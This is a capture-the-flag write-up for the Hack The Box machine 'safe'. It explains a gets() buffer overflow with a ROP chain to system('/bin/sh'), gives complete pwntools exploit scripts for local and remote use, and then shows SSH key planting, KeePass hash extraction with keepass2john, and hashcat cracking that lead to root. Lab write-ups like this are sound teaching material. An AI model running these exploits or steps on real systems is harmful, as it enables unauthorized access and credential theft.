# Hackthebox: safe

## 1. Analysis
At the time of writing, safe is active at `10.10.10.147`. Viewing the page gives the default Apache2 debian page. Nothing is visibly different, but viewing source reveals a comment at the start:
```
<!-- 'myapp' can be downloaded to analyze from here
     its running on port 1337 -->
```

Great, something to target. It's running on port `1337`, and can be downloaded at `10.10.10.147/myapp`. `file myapp` shows it's a 64bit `ELF` executable. The app will first run `/usr/bin/uptime`, and then print `What do you want me to echo back?`. It then waits for user input, uses `gets()` *\*cough*\* **insecure** *\*cough\** to get the user input, prints it to screen, then exits.

Running `echo $(perl -e 'print "A"x150') | ./myapp` gives us a lovely little `Segmentation fault` :). Further testing reveals that it will overwrite rbp, and crash, with more than 120 characters. Great, all we need is to throw in some `/bin/sh` shellcode and boom, shell... well, no. Unfortunately the binary has the `NX` bit set, meaning we're limited to ROP gadgets to do our bidding.

Analyzing the disassembly reveals a function called `test`, which is never called:
```x86asm
.text:0000000000401152                 public test
.text:0000000000401152 test            proc near
.text:0000000000401152 ; __unwind {
.text:0000000000401152                 push    rbp
.text:0000000000401153                 mov     rbp, rsp
.text:0000000000401156                 mov     rdi, rsp
.text:0000000000401159                 jmp     r13
.text:0000000000401159 test            endp
```
This is great, specifically the `jmp r13` part of it ;). All we need is a way to control `r13`. Let's see what `ropper` gives us:
```bash
$ ropper -f ./myapp | grep "r13"
0x0000000000401204: pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000401206: pop r13; pop r14; pop r15; ret; 
0x0000000000401203: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000401205: pop rsp; pop r13; pop r14; pop r15; ret; 
```
We don't want to touch rsp or rbp, and the first one just makes our payload larger - `0x0000000000401206` is our target. Remember that we can't just place some shellcode and jump to that, instead we'll abuse the use of `system()`, which is at `0x0000000000404060`. `system()` uses rdi for it's argument - a pointer to a string that is the command to be executed... now how would we modify rdi?... Once again, `test` comes to our rescue:
```x86asm
.text:0000000000401156                 mov     rdi, rsp
```
All we need is to place `/bin/sh` at `rsp` when it hits segfault. If we test this, we find out it's 120 characters in. `/bin/sh` is 8 characters, including null-byte (`/bin/sh\x00`), so we need 112 bytes of junk.

## 2. Putting it together:
Recapping the above: we need 112 bytes of junk, followed by `/bin/sh\x00`, then the address of the pop gadget which will be called. The next 3 values will go into `r13`, `r14`, and `r15` respectively. `r13` needs to be the address of `system()`, `r14`, and `r15` are irrelevant, and can be null. Finally comes the address of `test`, where the magic happens. The final payload should look something like this:
```x86asm
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ; junk 
/bin/sh\x00 ; string passed to system()
\x06\x12\x40\x00\x00\x00\x00\x00 ; address of pop gadget
\x40\x10\x40\x00\x00\x00\x00\x00 ; address of system() -> r13
\x00\x00\x00\x00\x00\x00\x00\x00 ; null -> r14
\x00\x00\x00\x00\x00\x00\x00\x00 ; null -> r15
\x52\x11\x40\x00\x00\x00\x00\x00 ; address of test
```
or in python:
```python
from pwn import *

junk = "A"*112
sh = "/bin/sh\x00"
pop = "\x06\x12\x40\x00\x00\x00\x00\x00"
system_r13 = "\x40\x10\x40\x00\x00\x00\x00\x00"
null_r14_r15 = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
test = "\x52\x11\x40\x00\x00\x00\x00\x00"

payload = junk + sh + pop + system_r13 + null_r14_r15 + test
app = process("./myapp")
app.sendline(payload)
app.interactive()
```
Running this gives us a lovely 
```
$
``` 
:)

## 3. Getting the user flag:
With some simple changes to the exploit, we can remotely exploit it:
```python
from pwn import *

junk = "A"*112
sh = "/bin/sh\x00"
pop = "\x06\x12\x40\x00\x00\x00\x00\x00"
system_r13 = "\x40\x10\x40\x00\x00\x00\x00\x00"
null_r14_r15 = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
test = "\x52\x11\x40\x00\x00\x00\x00\x00"

payload = junk + sh + pop + system_r13 + null_r14_r15 + test
app = remote("10.10.10.147","1337")
app.sendline(payload)
app.interactive()
```

Running this gives us a shell on the machine. Navigating to `/home/user` gives the user flag, which is... well, you can find out yourself ;). Time for the next step, which is getting the root flag.

## 4. Getting the root flag:
Looking in the user home directory, reveals a few interesting files:
```
$ ls
IMG_0545.JPG
IMG_0546.JPG
IMG_0547.JPG
IMG_0548.JPG
IMG_0552.JPG
IMG_0553.JPG
myapp
MyPasswords.kdbx
user.txt
```

`.kdbx`?! huh? What on earth is that? ~~Googling~~ DuckDuckGo-ing tells us that it's a keepass file. There's also a bunch of photos... could they have something to do with the `.kdbx`? Searching `JPG keepass` on duckduckgo links us to [here](https://keepass.info/help/base/keys.html): "The database can also be locked using a key file. A key file is basically a master password in a file... KeePass can generate key files for you, however you can also use any other, already existing file (like **JPG** image, DOC document, etc.).". [This](https://www.rubydevices.com.au/blog/how-to-hack-keepass) website talks about a tool called `keepass2john` which is used to extract master keys hashes from key files. Great, let's get these files on our local machine. We get our public key from `~/.ssh/id_rsa.pub` on our machine, and `echo` that into `~/.ssh/authorized_keys` on the remote machine:
```
echo "ssh-rsa **key** username@machinename" > .ssh/authorized_keys
```
Now we can use `scp` and `ssh`. For each image, we run `scp user@10.10.10.147:/home/user/IMG_xxx.JPG ./`, followed by `keepass2john -k IMG_xxx.JPG MyPasswords.kbdx`. We now have master password hashes we can crack. `hashcat` has an option for keypass hashes - `-m 13400`. Iterating over all the extracted hashes reveals that the third image (`IMG_0547.JPG`) contains the master password, which is `bullshit`. Using `keepassx`, we can open `MyPasswords.kdbx`, using password `bullshit`. KeePassX shows that there is a password in the db called "Root password". We `ssh` back into the machine (as user), and run `su root`, giving the password we found in the db:
```
user@safe:~$ su root
Password: 
root@safe:/home/user# whoami
root
root@safe:/home/user# cd ~
root@safe:~# ls
root.txt
root@safe:~# cat root.txt
<REDACTED>
```
Machine owned :)
